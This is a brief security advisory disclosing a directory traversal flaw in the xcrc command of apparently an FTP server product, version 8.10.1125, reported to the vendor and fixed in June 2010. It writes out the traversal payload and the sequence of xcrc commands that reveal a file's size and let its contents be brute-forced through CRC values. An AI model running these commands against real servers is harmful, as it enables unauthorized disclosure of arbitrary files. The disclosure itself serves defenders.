Affected: Versions 8.10.1125 and likely previous

Issue:  the xcrc command is susceptible to a directory traversal attack which will allow disclosure of the contents of any file on the server

Details: xcrc ..//..//..//..//a.txt 1 <some huge number> will disclose the file's size

xcrc ..//..//..//..//a.txt 1 2
xcrc ..//..//..//..//a.txt 1 3
...
xcrc ..//..//..//..//a.txt 1 <filesize>

when automated allows for an easy brute force attack on the crc's

Status: Submitted to Vendor 6/14/10 fixed 6/15/10
